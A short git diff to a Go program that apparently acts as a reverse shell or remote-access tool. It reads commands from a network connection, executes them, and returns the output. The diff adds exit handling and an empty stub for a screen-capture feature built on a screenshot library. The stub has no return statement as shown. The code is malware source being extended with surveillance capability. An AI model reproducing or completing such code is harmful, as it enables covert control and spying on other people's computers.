@@ -9,6 +9,8 @@ import (
 	"os/exec"
 	"strings"
 	"time"
+
+	"github.com/kbinani/screenshot"
 )
 
 const (
@@ -21,7 +23,15 @@ func main() {
 	for {
 		cmd, _ := bufio.NewReader(conn).ReadString('\n')
 		cmd = strings.TrimSpace(cmd)
-		send_msg(conn, exec_cmd(cmd))
+
+		if cmd == "q" || cmd == "quit" || cmd == "exit" {
+			send_msg(conn, "Connection closing :|")
+			conn.Close()
+		} else if cmd == "capturescr" {
+
+		} else {
+			send_msg(conn, exec_cmd(cmd))
+		}
 	}
 }
 
@@ -44,4 +54,8 @@ func exec_cmd(cmd string) string {
 		return err.Error()
 	}
 	return string(result)
+}
+
+func capture_scr() string {
+
 }
